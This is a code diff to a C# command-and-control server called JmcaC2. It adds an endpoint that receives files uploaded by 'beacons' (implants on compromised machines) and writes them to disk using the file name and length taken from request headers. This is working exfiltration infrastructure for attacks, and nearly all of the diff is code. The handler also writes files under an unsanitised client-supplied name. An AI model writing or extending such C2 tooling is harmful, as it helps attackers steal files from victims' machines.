@@ -217,7 +217,6 @@ namespace JmcaC2
         // POST requests are for task results
         public static void HandleConnections()
         {
-            //TODO: encryption
             while (serverRunning)
             {
                 try
@@ -283,10 +282,48 @@ namespace JmcaC2
                     {
                         // Handle POST request for task results
                         Console.WriteLine("Received POST request for task results");
-                        using (var reader = new System.IO.StreamReader(request.InputStream, request.ContentEncoding))
+                        if (context.Request.Url!.OriginalString.Contains("upload"))
                         {
-                            string result = reader.ReadToEnd();
-                            Console.WriteLine("Task Result: " + result);
+                            string? beaconName = context.Request.Headers["BeaconName"];
+                            string? fileName = context.Request.Headers["File-Name"];
+                            string? fileLengthStr = context.Request.Headers["File-Length"];
+                            if (fileName is null || fileLengthStr is null)
+                            {
+                                Console.WriteLine("[-] Missing upload headers");
+                                response.StatusCode = 400;
+                                response.Close();
+                                return;
+                            }
+                            long fileLength = long.Parse(fileLengthStr);
+
+                            Console.WriteLine($"[+] Upload from: {beaconName}");
+                            Console.WriteLine($"[+] File: {fileName}");
+                            Console.WriteLine($"[+] Bytes: {fileLength}");
+
+                            byte[] buffer = new byte[fileLength];
+
+                            using (var input = context.Request.InputStream)
+                            {
+                                int read = 0;
+                                while (read < fileLength)
+                                {
+                                    int n = input.Read(buffer, read, (int)(fileLength - read));
+                                    if (n == 0) break;
+                                    read += n;
+                                }
+                            }
+
+                            File.WriteAllBytes(fileName, buffer);
+
+                        }
+                        else
+                        {
+
+                            using (var reader = new System.IO.StreamReader(request.InputStream, request.ContentEncoding))
+                            {
+                                string result = reader.ReadToEnd();
+                                Console.WriteLine("Task Result: " + result);
+                            }
                         }
                         response.StatusCode = (int)HttpStatusCode.OK;
                         response.Close();
